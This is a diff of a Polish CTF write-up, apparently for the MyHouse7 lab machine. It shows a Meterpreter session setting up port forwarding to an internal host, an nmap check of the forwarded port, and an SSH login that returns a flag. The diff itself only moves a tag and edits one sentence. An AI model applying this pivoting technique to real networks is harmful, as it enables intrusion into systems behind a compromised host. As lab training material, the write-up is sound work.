@@ -231,7 +231,6 @@ sessions 1
 portfwd add -l 24 -p 24 -r 172.31.20.194
 portfwd
 ```
-</div>
 ```console
 msf6 auxiliary(scanner/portscan/tcp) > sessions 1
 [*] Starting interaction with 1...
@@ -251,6 +250,7 @@ Active Port Forwards
 
 meterpreter >
 ```
+</div>
 Przechodzimy na jakąkolwiek konsolę w naszym systemie i sprawdzamy czy jest otwarty port 24:
 {: .text-justify}
 ```console
@@ -280,7 +280,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
 ```
-**SSH** - łamanie czymkolwiek przez *portfwd* to masakra, nie wiem czym to jest spowodowane, więc od razu wejdźmy.
+**SSH** - łamanie czymkolwiek przez *portfwd* to masakra, nie wiem czym to jest spowodowane, więc od razu wejdźmy na **Shella**.
 ```console
 root@kali:/home/szikers/myhouse7-1# ssh 127.0.0.1 -p 24
 FLAG: {{tryharder:308}}
